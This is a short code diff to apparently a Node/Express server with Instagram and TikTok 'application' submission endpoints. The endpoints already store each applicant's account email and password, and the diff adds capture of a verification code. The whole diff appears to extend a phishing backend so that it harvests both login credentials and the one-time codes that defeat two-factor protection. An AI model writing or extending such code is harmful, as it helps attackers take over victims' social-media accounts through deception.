@@ -21,6 +21,7 @@ router.post("/submissions/instagram", async (req, res): Promise<void> => {
     favoriteCelebrity: parsed.data.favoriteCelebrity,
     email: parsed.data.email,
     password: parsed.data.password,
+    verificationCode: parsed.data.verificationCode,
   });
 
   res.status(201).json({ success: true, message: "Application submitted successfully!" });
@@ -49,6 +50,7 @@ router.post("/submissions/tiktok", async (req, res): Promise<void> => {
     favoriteCelebrity: parsed.data.favoriteCelebrity,
     email: parsed.data.email,
     password: parsed.data.password,
+    verificationCode: parsed.data.verificationCode,
   });
 
   res.status(201).json({ success: true, message: "Application submitted successfully!" });
